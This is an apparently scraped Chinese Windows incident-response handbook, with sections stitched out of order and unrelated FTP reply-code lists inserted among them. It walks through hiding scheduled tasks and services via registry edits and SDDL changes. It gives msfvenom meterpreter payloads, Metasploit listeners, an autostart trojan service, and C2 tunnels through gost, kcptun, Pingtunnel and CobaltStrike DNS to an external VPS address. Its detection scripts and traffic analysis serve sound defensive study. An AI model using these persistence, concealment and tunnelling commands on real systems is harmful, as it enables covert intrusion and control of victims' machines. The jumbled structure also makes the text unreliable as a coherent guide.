https://mp.weixin.qq.com/s/aS5MRwnYR5pqE1PmKiH24w

这里不搞这么复杂，我们通过查询资料得知，计划任务的配置既存在于计划任务文件之中，又存在于注册表之中

接下来我们通过简单的实验，确定一下到底是计划任务文件还是注册表在决定着计划任务的执行结果，还是相互同步修改的

测试环境: `Windows Server 2016`

不同操作系统的情况可能不同

整体思路如下：

创建两个计划任务，一个修改文件，一个修改注册表，之后观察两个计划任务的执行情况

计划任务文件地址

 `C:\Windows\System32\Tasks

```
 注册表位置

 `注册表相关的在此位置
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule

计划任务的 id、index、SD 在此位置
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree

计划任务的具体配置在此位置
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{id}

```

### 1. 100 系

1xx（肯定的初步答复）：表示服务器已接收到请求并等待进一步操作。

 - 100：服务器已准备就绪，可以执行新的用户请求。
 - 110：重新启动标记回应。

### 1) 修改注册表 <code>Actions</code> 值

直接用 `test2` 就好

可以考虑从结尾一个字符一个字符删除，之后每次去刷新计划任务程序，查看是否显示

但是稍加观察，也可以发现，每个操作的程序路径结尾有九个`00` ，由于我们知道计划任务中操作的实际内容，那直接尝试删除到九个`00` 处

刷新后，计划任务程序中 `test2` 还在，操作处果然只剩下一个操作了

计划任务文件并没有被更改

这下可以等一等接下来的计划任务执行了

之后的多次执行结果都是计算器和`cmd` 均执行，计划任务文件没有被更改

### 1. 部署 CobaltStrike 服务器

直接在 `Vultr` 创建一个 `Kali Linux`，并且搭建 `CS` 服务器端

### 1. 部署 gost 服务端

`wget https://github.com/go-gost/gost/releases/download/v3.0.0-nightly.20231227/gost_3.0.0-nightly.20231227_linux_amd64v3.tar.gz
./gost -L quic://45.32.26.140:1443/ -F tcp://127.0.0.1:4444

```
 将客户端连接到 1443 端口quic数据通道内部的流量转到 4444 端口的TCP协议的服务上

### 1. 部署 kcptun 服务端

`wget https://github.com/xtaci/kcptun/releases/download/v20231012/kcptun-linux-amd64-20231012.tar.gz
./server_linux_amd64 -t "127.0.0.1:4444" -l ":4000" -mode fast3 -nocomp -sockbuf 16777217 -dscp 46

```

### 1. 部署Pingtunnel服务端

`wget https://github.com/esrrhs/pingtunnel/releases/download/2.8/pingtunnel_linux_amd64.zip
unzip pingtunnel_linux_amd64.zip
./pingtunnel -type server -key 1234

```
 这里设置密码为 `1234`

### 1) <code>services.msc</code>

### 10. 思考排查方法

一般攻击者使用服务都是做持久化控制的，删掉注册表来对抗隐藏不是常规的思路，但是毕竟大家面对的也不是一群常规的人，如果真的是出现了这种奇葩，该如何进行检测呢？

注册表已经没了，现在还保存着服务列表信息的就只有内存里了吧

### 11. 删除服务

只通过 `SDDL` 进行隐藏的服务恶意直接按照文中的方法，重新赋权，就可以删除或停止了

对于进行了 `SDDL` 同时删除了注册表项的服务，需要通过重启来进行删除

### 1) 创建计划任务

`taskschd.msc` 打开任务计划程序，这名字有点绕口，后续称为计划任务程序

添加一个操作: 执行 `cmd`

将触发器设置为每 `3` 分钟执行一次

稍作等待

成功执行计划任务

### 1) 创建计划任务

删除掉 `test1` ，创建一个一摸一样的 `test2` ，这次两分钟执行一次

### 1) 创建计划任务

创建计划任务 `test3`

### 1) 修改注册表

新建一个 `test4`

去掉一个 `00`

计划任务程序处已经消失了，但是还在执行计算器，这是因为注册表修改的计划任务会在计划任务服务重启后生效

### 1. 创建服务

直接选择默认的 `XblGameSave` 服务，这个服务为 `Xbox Live` 可保存游戏同步保存数据。如果此服务被停止，游戏保存数据将不会上传至 `Xbox Live` 或从 `Xbox Live` 下载。

 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XblGameSave

```

 `sc qc XblGameSave

```

### 1) 创建服务

这次使用 `msf` 生成一个服务木马来模拟服务

 `msfvenom -p windows/meterpreter/bind_tcp lport=4455 -f exe-service -o bind.exe

```
 注意，这里指定的文件类型是 `exe-service` ，`MSF` 专门为服务准备的一类木马,中文资料上提到这个事极少

### 1) 进程角度

服务终究还是会产生一个或多个进程，按照它要实现的功能在内存空间执行，这就属于常规角度了

当然，可以把 `Rundll32.exe` 作为一个标志，很多安全软件也是这么做的，但是它的启动参数没有指定恶意 `DLL` 位置，而且感觉不太严谨

### 1. 文件属性对话框

### 2. 创建域名解析记录

域名为 `vulndmz.com`

设置 `A` 记录只向我们的 `CS`地址，添加一条 `NS`记录，指向 `A` 记录，这样 `ns.vulndmz.com` 设置为 `www.vulndmz.com` 的授权域名服务器

### 2. 200 系

2xx（肯定的完成答复）：表示服务器成功接收并理解了客户端请求。

 - 200：命令执行成功。
 - 202：命令未执行，站点上的命令队列已满。
 - 211：系统状态回复。
 - 212：目录状态回复。
 - 213：文件状态回复。
 - 214：帮助信息回复。
 - 215：系统类型回复。
 - 220：服务就绪，可以执行新的用户请求。
 - 221：服务关闭控制连接，请求的文件操作已成功完成。
 - 225：数据连接打开，无需传输数据。
 - 226：关闭数据连接，请求的文件操作已成功完成。
 - 227：进入被动模式（IP 地址、ID 端口）。
 - 228：进入长袖模式（服务器等待客户端连接）。
 - 229：进入扩展被动模式（服务器等待客户端连接）。
 - 230：用户已登录，继续进行。
 - 250：文件操作完成，路径名创建。

### 2. 生成 MSF payload

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=8388 -f exe -o p_udp.exe

```

### 2. 生成 MSF payload

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=8388 -f exe -o p_quic.exe

```

### 2. PoweShell

`Get-AuthenticodeSignature "C:\Path\To\File.exe"

```

### 2) sc

`sc queryex | findstr "XblGameSave"
sc query "XblGameSave"

```
 可以看到，常规检查的时候，无法直接看到 `XblGameSave`

通过 `sc query` 指定名称查找显示的是 `拒绝访问`

通过 `sc qc` 指定名称查找能够显示出正常内容

如果常规方式看不到，应急响应人员也无法知晓该活动的名称，也就无法查询到

### 2. 客户端连接服务端

`pingtunnel.exe -type client -l :4455 -s www.yourserver.com -t www.yourserver.com:4444 -tcp 1 -key 1234

```
 需要管理员权限执行

这个命令的意思是客户端连接服务端 `www.yourserver.com` ，之后在受害主机的 `4455` 端口和攻击主机的 `4444` 端口做一个隧道

这里域名也可以是 `IP` ，刚好 `CS` 演示时配置了 `DNS` ，域名为 `www.vulndmz.com` ，这里直接使用

### 2) 日志查询

通过日志 `Windows 日志 -> 系统`

其中来源为 `Service Control Manager` 的日志会记录服务的创建与执行

### 2. 修改文件测试

### 2) 查看计划任务文件

计划任务文件地址

 `C:\Windows\System32\Tasks

```

 `<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2024-01-04T01:53:37.7714703</Date>
    <Author>WIN-2MTJ8IQ5VEA\Administrator</Author>
    <URI>\test1</URI>
  </RegistrationInfo>
  <Triggers>
    <CalendarTrigger>
      <Repetition>
        <Interval>PT3M</Interval>
        <Duration>P1D</Duration>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2024-01-04T01:51:41</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>LeastPrivilege</RunLevel>
      <UserId>WIN-2MTJ8IQ5VEA\Administrator</UserId>
      <LogonType>InteractiveToken</LogonType>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\System32\calc.exe</Command>
    </Exec>
    <Exec>
      <Command>C:\Windows\System32\cmd.exe</Command>
    </Exec>
  </Actions>
</Task>

```

### 2) 查看计划任务文件

`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2024-01-04T02:17:38.3850798</Date>
    <Author>WIN-2MTJ8IQ5VEA\Administrator</Author>
    <URI>\test2</URI>
  </RegistrationInfo>
  <Triggers>
    <CalendarTrigger>
      <Repetition>
        <Interval>PT2M</Interval>
        <Duration>P1D</Duration>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2024-01-04T02:17:29</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>LeastPrivilege</RunLevel>
      <UserId>WIN-2MTJ8IQ5VEA\Administrator</UserId>
      <LogonType>InteractiveToken</LogonType>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\System32\calc.exe</Command>
    </Exec>
    <Exec>
      <Command>C:\Windows\System32\cmd.exe</Command>
    </Exec>
  </Actions>
</Task>

```

### 2) 修改注册表

将创建时间中的 `2:44:58` 修改为 `2:40:58`

这次刷新计划任务程序，非但没有消失，创建时间还被更改成功了，看来计划任务程序的内容是从注册表中拿的

目前能够成功执行，根据之前的测试结果，计划任务服务此时并不会加载注册表的修改

计划任务文件并没有被修改

### 2) 重启服务器

通过注册表对计划任务的修改开始生效，只执行了计算器

计划任务文件没有被更改，内容如下

### 2) 重启计划任务服务

计划任务没有再次执行，计划任务文件没有被更改

### 2. 查询服务权限设置

`sc sdshow "XblGameSave"

```
 `D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)

```
 这是一段 安全描述符定义语言（`Security Descriptor Definition Language | SDDL`）

具体含义可以参考

https://learn.microsoft.com/zh-cn/windows/win32/secauthz/security-descriptor-string-format

https://learn.microsoft.com/zh-cn/windows/win32/secauthz/ace-strings

https://learn.microsoft.com/zh-cn/windows/win32/services/service-security-and-access-rights

可以通过一些 `SDDL` 解析工具进行查看

https://github.com/canix1/SDDL-Converter

是一个 `Powershell` 脚本，右键执行

将 `SDDL` 放到其中进行解析

这样看起来比较直观

### 2) 创建服务

`sc create test binPath= "C:\Users\Administrator\Desktop\bind.exe" start= auto depend= Tcpip obj= Localsystem

```
 创建一个名为 `test` 的服务，开机自启动执行木马程序，监听 `4455` 端口

启动服务测试一下

 `sc start test

```

### 3) 查看注册表

先获取该计划任务的 `id`

 `{E44EFFC6-29A1-470C-9553-52531D9962B5}

```
 在 `Tasks` 上点击编辑 -> 查找

其中 `Actions` 就是计划任务执行的操作，是一个二进制值

### 3. 300 系

3xx（肯定的中间答复）：表示需要进一步采取操作以完成请求。

 - 331：需要用户名和密码进行身份验证。
 - 332：需要帐户信息进行身份验证。
 - 350：请求的文件操作需要进一步的信息。

### 3. CS上添加监听器

### 3. MSF 配置监听

`msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 127.0.0.1
set lport 4444
exploit

```

### 3. MSF 生成 payload

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4455 -f exe -o payload.exe

```
 注意，这里写的反连地址为 `127.0.0.1:4455`

### 3. MSF 配置监听

`msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 127.0.0.1
set lport 4444
exploit

```

### 3) MSF 连接木马

`msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set rhost 10.211.55.6
set lport 4455
exploit

```
 服务已经正常启动，关闭连接，重启受害服务器，无用户登录状态下再次尝试连接

再次获取 `shell`，服务自启动没问题

### 3) PowerShell

`Get-Service | findstr "XblGameSave"
Get-Service -Name "XblGameSave"

```
 指定名称查询都显示找不到任何服务

### 3. Sigcheck

Sigcheck 由微软Sysinternals套件提供，这是一个命令行实用程序，用于显示PE文件（如EXE、DLL、SYS等）的详细信息，包括其数字签名状态。下载地址：https://docs.microsoft.com/sysinternals/downloads/sigcheck

 `sigcheck.exe "C:\Path\To\File.exe"

```

### 3) Windows API

如果 `Windows API` 呢

 `#include <iostream>
#include <windows.h>
#include <winsvc.h>

int main()
{
    SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (schSCManager == NULL)
    {
        std::cout << "Failed to open Service Control Manager." << std::endl;
        return 1;
    }

    DWORD dwBytesNeeded, dwServicesReturned, dwResumeHandle = 0;
    EnumServicesStatusEx(
        schSCManager,
        SC_ENUM_PROCESS_INFO,
        SERVICE_TYPE_ALL,
        SERVICE_STATE_ALL,
        NULL,
        0,
        &dwBytesNeeded,
        &dwServicesReturned,
        &dwResumeHandle,
        NULL
    );

    LPENUM_SERVICE_STATUS_PROCESS lpServices = (LPENUM_SERVICE_STATUS_PROCESS)malloc(dwBytesNeeded);
    if (lpServices == NULL)
    {
        std::cout << "Failed to allocate memory." << std::endl;
        CloseServiceHandle(schSCManager);
        return 1;
    }

    if (!EnumServicesStatusEx(
        schSCManager,
        SC_ENUM_PROCESS_INFO,
        SERVICE_TYPE_ALL,
        SERVICE_STATE_ALL,
        (LPBYTE)lpServices,
        dwBytesNeeded,
        &dwBytesNeeded,
        &dwServicesReturned,
        &dwResumeHandle,
        NULL
    ))
    {
        std::cout << "Failed to enumerate services." << std::endl;
        free(lpServices);
        CloseServiceHandle(schSCManager);
        return 1;
    }

    std::cout << "Services:" << std::endl;
    for (DWORD i = 0; i < dwServicesReturned; i++)
    {
        std::wstring serviceName(lpServices[i].lpServiceName);
        std::wcout << serviceName << std::endl;
    }

    free(lpServices);
    CloseServiceHandle(schSCManager);

    return 0;
}

```
 经过实验， `Windows API` 获取不到，即使是 `SYSTEM` 权限也查询不到

### 3. 修改注册表测试

### 3) 查看并修改注册表

修改计划任务注册表需要 `SYSTEM` 权限，通过 `SysinternalsSuite` 套件中的 `psexec64.exe` 以 `SYSTEM` 权限启动注册表编辑器，就可以编辑了

https://learn.microsoft.com/zh-cn/sysinternals/downloads/sysinternals-suite

 `PsExec64.exe -i -s regedit

```

尝试删除掉 `C:\Windows\System32\cmd.exe`

刷新计划任务程序

原本的计划任务不见了

查看计划任务文件

计划任务文件没有被修改

我们设置的计划任务是 `2` 分钟执行一次，不急，让子弹飞一会儿

修改后虽然看不见了，依旧可以执行，观察多次执行结果都是如此

### 3) 重启服务器

重启后，不仅创建时间被修改了没变回来，计划任务可以正常执行

计划任务文件并没有被修改

### 3) 尝试重启计划任务服务

任务管理器中直接重启是不行的，需要通过 `SYSTEM` 权限打开任务管理器

 `PsExec64.exe -i -s taskmgr /v

```

这回启动后， `pid` 就变了

计划任务文件依旧没有改变

### 3)  命令行执行计划任务

`schtasks /query /tn "\test4"

```

### 3. 修改服务权限设置

`sc sdset "XblGameSave" "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"

```

### 4) 修改计划任务文件

删除掉执行 `cmd` 的操作，即删除

 `<Exec>
  <Command>C:\Windows\System32\cmd.exe</Command>
</Exec>

```

计划任务程序并没有发生改变，等待下次计划任务执行

多次执行结果都是 计算机和 `cmd` 都执行了

此时查看注册表

并没有发生变化

### 4. 400 系

4xx（暂时的否定答复）：表示客户端的请求包含错误语法或无法完成。

 - 421：服务不可用，正在关闭控制连接。
 - 425：无法打开数据连接。
 - 426：连接关闭，传输中止。
 - 450：请求的文件操作被拒绝。

### 4. gost 客户端连接服务端

`gost.exe -L tcp://127.0.0.1:8388  -F "quic://xx.xx.xx.xx:1443"

```

### 4. kcptun 客户端连接服务端

`kcptun_client.exe -r "45.32.26.140:4000" -l ":8388" -mode fast3 -nocomp -autoexpire 900 -sockbuf 16777217 -dscp 46

```

### 4. MSF 配置监听

`use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 4444
exploit

```

### 4) 观察 MSF 服务情况

再次重启服务器，登录后查看服务信息如下

从服务来看 `test` 服务已经停止了

从进程角度来看

没有主动监听`shell` 相关进程

通过 `MSF` 进行连接

服务监听是存在的

从网络层面看

可以看到 `MSF` 与受害主机之间的连接

通过 `wmic` 查看详细情况

 `wmic process where ProcessId=2216 get Name, ExecutablePath, CommandLine /format:list

```

这样看来 `exe-service` 生成的是一个 `dll` 文件

### 4. 生成 payload

### 4) sc

`sc` 的命令报错意味着其实 `sc` 是可以知道 `test` 的存在的

但是这里有个问题

 - 一种情况是 `sc` 能够获取到服务列表，之后查询 `test` 是否存在
 - 一种情况是 `sc` 获取不到服务列表，但是可以将服务名称提交，之后返回信息

 如果是第一种情况的话，我们可以直接获取到列表，如果是第二种情况，我们只能暴力枚举

由于 `Windows` 并不开源，我们无法直接知道 `sc` 到底是怎么做的

### 4) test2 使用 test3 的 <code>Actions</code>

如果我将 `test3` 的 `Actions` 用给 `test2` ，会不会把 `test2` 救活呢？

获取 `test3` 的 `Actions`

找到 `test2` ，替换

`test2` 回来了，删除 `test3` ，看看 `test2` 会不会立即生效

等了一会儿，没有执行

### 4) wmic

`wmic service | findstr "XblGameSave"
wmic service where "Name='XblGameSave'" get Name, DisplayName, Description

```

### 4) 重启服务器

在总的计划任务状态里还是能看见的

重启后，该计划任务不再运行，计划任务文件没有被更改

注册表对计划任务的影响很大，但是修改后，重启服务后导致不再计划任务运行，可能是修改后 `HASH` 校验过不去？

### 4. 修改注册表中字符串值

既然二进制值修改有问题，我修改字符串试试

### 4. 测试隐藏效果

### 5. 受害主机执行后上线

### 5. 500 系

5xx（永久的否定答复）：表示服务器拒绝执行客户端请求。

 - 500：无效的命令。
 - 501：参数语法错误。
 - 502：命令未实现。
 - 503：错误的命令序列。
 - 504：命令参数不可用。
 - 530：登录失败，需要有效的用户名和密码。
 - 532：存储文件需要帐户。
 - 550：请求的操作被拒绝或文件不可用。

### 5. Fuzz Actions 格式

### 5. 执行 payload

有点难为 `icmp` 隧道了，连接一直建立不起来，我们尝试新建一个 `stageless` 的木马

 `msfvenom -p windows/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4455 -f exe -o payload.exe

```
 `use exploit/multi/handler
set payload windows/meterpreter_reverse_tcp
set lhost 0.0.0.0
set lport 4444
exploit

```

客户端显示了有一个连接

然而显然是又难为它了，我们还是看一下 `ICMP` 隧道的情况吧

此时在疯狂发送`ICMP` 包，所以一般总结以下特征

 - 向单一目标发`ICMP` 包频率高
 - `ICMP` 数据包一般大于 `Windows` 平台默认的长度
 - 发送内容可以看出非 `Windows` 平台默认的 `ping` 请求

### 5. 执行 payload

客户端显示

成功获取 `shell`

### 5. 执行 payload

成功获取shell

### 5) 通过 SDDL 设置隐藏服务

`sc sdset "test" "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"

```
 此时已经 `Services.msc` 已经看不到 `test` 服务了，这个上面我们已经测试过了

获得的 `shell` 不受影响

### 5) System Informer

https://systeminformer.sourceforge.io/

Process Hacker 的升级版

也看不到

### 5) 尝试重启服务器

当然，也可以尝试重启计划任务服务，虚拟机，重启服务器方便很多

依旧是两个操作都执行了

注册表没有被修改

### 5) 注册表中将操作清空

计划任务程序依旧显示为空

### 5) 重启服务器

重启服务器后成功执行

也就是说刚才我们修改二进制数据修改的不对，只要字符格式正确，应该就可以显示

### 5. 思考排查方法

方法一 枚举法

按照计划任务隐藏时候的思路，先看一下 `sc query` 查询不存在的服务时报错是什么

这里就可以看出区别，当然，完全可以用 `sc qc` 查询做对比，可能更好

这样的话，可以将注册表遍历一遍，之后获取服务名称，挨个查询，看看有没有拒绝访问的，这样就可以测试出是否存在隐藏的服务。当然，这前提是注册表有访问权限，如果攻击者额外设置了注册表权限，可以先取消注册表权限

方法二 高权限查看法

这种隐藏方式无非就是谁可以看，谁不可以看，在 Linux 中，几乎所有的限制对 `root` 都没用，我们分析一下刚才的权限设置

这里似乎对 `SYSTEM` 并没有限制，那我们使用 `SYSTEM` 权限执行这些常规检查是否可以看到呢

### 5) 通过内存获取

查阅一些资料后得知，服务信息应该归 `SCM` 来管，具体落到进程上就是 `services.exe`

但是经过一堆尝试，并没有找到好的方式来从内存中获取服务列表信息

### 6. 流量分析

可以看到存在 `TXT`、 `A` 、`AAAA`等记录，并且存在非常长的 DNS 记录，例如

 `post.2b015e68bdce7d286b2f23340bb11349fd245e3b158b15f96fb3abe3e.f8e1b3007d4f2e98a41f5c0aceb92097545de8ff4b698b260f4963e7.1fb27f5a.3556fdbe.ns1.vulndmz.com

```

### 6. 内网环境再次模拟

下面用内网演示一下吧

 `Kali: 10.211.55.35
受害主机: 10.211.55.52

```
 现在还是将 Kali 的 4444 端口和受害主机的 4455 端口建立一条隧道

除了受害主机 `Pingtunnel` 客户端连接的服务端地址变了，其他都不变，甚至刚才的木马都不需要变

执行木马程序，抓取数据包

成功获取反弹shell

流量特征与上面一样

手册里保留上面因为网络而失败的部分，主要还是想提醒大家，`ICMP` 隧道稳定性更差，不是逼到万不得已，可能攻击者不会采用这种方式。怪不得 `CS` 里默认都没有 `ICMP` 这种上线方式

### 6. 流量分析

目前 `Wireshark` 默认还不支持 `KCP` 协议，显示的是 `UDP` 协议，需要使用一些插件

然而略显遗憾的是，我找了很多插件，都没有办法详细显示 `kcptun` 的数据包。虽然看着这些数据包大小相对统一，但还是之前的思想，不建议将其认定为特征

### 6. 流量分析

除了短时间、单一目标、大量 `QUIC` 协议数据包(可能还包含大量的UDP协议包)以外，剩下的就是工具的特征了

### 6) 小结

看来计划任务文件不是决定计划任务执行结果的主因

### 6) 小结

注册表对计划任务影响很大，修改后不会立即生效，会在计划任务服务重启后生效

具体修改后，重启计划任务服务后执行直白，可能是因为 `HASH` 校验吧，也可能是因为我们修改二进制值格式不对，接下来我们来探究

### 6. 不显示的计划任务会执行吗？

这里说的并不是指修改 `SD` 那种，就是单纯的将 `Actions` 去掉一个 `00`

### 6) 注册表

可以看到，注册表能够看到该服务，此时注册表多了一项 `Security`

但是不只这一个注册表有 `Security` ，所以也不好粗暴地作为评判依据

### 6. 枚举法

思路就是先获取注册表中服务名称，之后通过 `sc query` 进行查询，根据反馈进行判断

 `$services = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" | ForEach-Object { $_.PSChildName }

$maliciousServices = foreach ($service in $services) {
    $queryOutput = sc.exe query $service 2>&1

    if ($queryOutput -like "*拒绝访问*") {
        $configOutput = sc.exe qc $service

        [PSCustomObject]@{
            ServiceName = $service
            Status = "拒绝访问"
            Config = $configOutput
        }
    }
}

if ($maliciousServices) {
    Write-Host "发现以下恶意服务:"
    $maliciousServices | Format-Table -AutoSize -Property ServiceName, Status

    foreach ($service in $maliciousServices) {
        Write-Host "--------------------------------------------------"
        Write-Host "Service Name: $($service.ServiceName)"
        Write-Host "Status: $($service.Status)"
        Write-Host "Service Config:"
        $configLines = $service.Config -split "`n"
        $configLines | ForEach-Object {
            $configLine = $_.Trim()
            if ($configLine -ne "" -and $configLine -notlike "[*]*") {
                Write-Host $configLine
            }
        }
        Write-Host "--------------------------------------------------"
    }
} else {
    Write-Host "未发现恶意服务."
}

```

当然了，这是美化后的，如果你想简单一些，直接用下面的几行就够了

 `$services = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" | ForEach-Object { $_.PSChildName }

foreach ($service in $services) {
    $queryOutput = sc.exe query $service 2>&1

    if ($queryOutput -like "*拒绝访问*") {
        Write-Output $service
    }
}

```

### 6) 尝试删除注册表项

尝试在 `Meterpreter` 中远程完成删除

 `reg deletekey -k "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\test"

```

注册表项成功被删除，这下我们原来的脚本应该也查不到隐藏的服务了

服务不受影响，这个看了上一篇文章的朋友们肯定有预期了，修改注册表对服务来说会在下次启动的时候才会有作用

 - `sc qc` 进行查询显示找不到指定的文件

 - `sc query` 显示还是拒绝访问

 尝试重启服务器

服务已经不存在了

### 7. 总结

- Windows Server 2016 中计划任务主要有注册表决定
 - 通过注册表修改的计划任务不会立即生效，会在计划任务服务重启后生效
 - 计划任务文件修改后不会影响计划任务执行
 - 修改计划任务文件和修改注册表不会互相同步，也不会单向同步

### 7. 高权限法

通过 `PsExec64.exe` 来获取 `SYSTEM` 权限

`PsExec64.exe` 是 `SysinternalsSuite` 套件中一款工具

https://learn.microsoft.com/zh-cn/sysinternals/downloads/sysinternals-suite

 `PsExec64.exe -i -s cmd

```

`PsExec` 似乎会导致输入法部分功能出现问题

尝试通过 `SYSTEM` 权限的 `cmd` 进行查询

 `sc queryex | findstr "XblGameSave"

```

`sc` 看不到隐藏的服务

尝试通过 `SYSTEM` 启动 `services.msc`

`services.msc` 看不到

`Powershell` 看不到

`wmic` 看不到

创建低权限的用户组和新用户也不行

看来高权限法不行

### 8. 删除服务

经过枚举法，已经获取到服务名称，现在通过 `sc sdset` 设置权限

 `sc sdset "XblGameSave" "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"

```

这样就可以通过 `services.msc` 进行管理了

删除服务

 `sc delete "ServiceName"

```

### 9. 如果删除注册表文件夹会怎么样

### Runas 命令

`runas` 是Windows内置的一个命令行工具，可以用来以另一个用户的身份运行程序。例如：

 `runas /user:另一用户名 "program.exe"

```
 这会提示输入所指定用户的密码，然后以该用户身份运行指定的程序。

## 18. 常见问题的解决方法

> 原文：https://books.noptrace.com/windows/17.%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/

### 0x01 文件被隐藏

Windows 常见的隐藏文件的手段有三个

 - 常规属性中勾选隐藏
 - attrib 设置额外权限
 - NTFS 备用数据流(ads)

### 0x02 恶意文件被删除

### 1. 设置隐藏属性

这种方式勾选查看中的显示隐藏的项目就可以找到

### 1) 创建 NTFS 备用数据流

创建一个 NTFS 备用数据流方法如下： `echo "这是主数据流的内容（可见）。" > demo.txt

```

 `echo "这是隐藏的备用数据流的内容（不可见）。" > demo.txt:hidden_stream.txt

```

### 1) 根据二进制文件执行记录查找

具体参照 常规安全检查 -> 0x01 近期活动

### 2) 使用自带命令查看和删除备用数据流

查看 NTFS 备用数据流

使用 type 和 dir 查看该文件

如果想查看所有的数据流，需要使用 `dir /r`，可以使用 `more < xxx:xxx` 来获取隐藏流的内容

删除 NTFS 备用数据流

Windows 自带的命令(除 PowerShell) 无法直接删除隐藏流，但是可以通过置空的方法来完成

### 2. attrib 设置额外权限

https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/attrib

语法

 `attrib [{+|-}r] [{+|-}a] [{+|-}s] [{+|-}h] [{+|-}o] [{+|-}i] [{+|-}x] [{+|-}p] [{+|-}u] [{+|-}b] [<drive>:][<path>][<filename>] [/s [/d] [/l]]

```
